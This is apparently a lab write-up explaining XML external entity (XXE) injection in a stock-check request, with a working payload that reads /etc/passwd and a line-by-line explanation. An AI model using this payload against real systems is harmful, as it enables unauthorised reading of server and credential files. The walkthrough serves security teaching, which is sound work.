# Lab1: Exploiting XXE using external entities to retrieve files

We start by intercepting a request that sends XML data to the server. The target field is , which looks like a good injection point.

Then craft a payload that defines an external entity and uses it inside the XML:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY exploit SYSTEM "/etc/passwd"> ]>
<stockCheck>
    <productId>&exploit;</productId>
    <storeId>1</storeId>
</stockCheck>
```
What does this do?
- `<!DOCTYPE foo [...]>` — defines a custom DTD (Document Type Definition) inside the XML.
- `<!ENTITY exploit SYSTEM "file:///etc/passwd">` — creates an entity named exploit that loads the contents of /etc/passwd.
- `<productId>&exploit;</productId>` — uses the entity, which the XML parser replaces with the actual file content.
If the server’s XML parser allows external entities, it will read /etc/passwd and include it in the response.

<img width="1038" height="626" alt="image" src="https://github.com/user-attachments/assets/36be745a-06fb-488f-a6ce-1d72f8976120" />






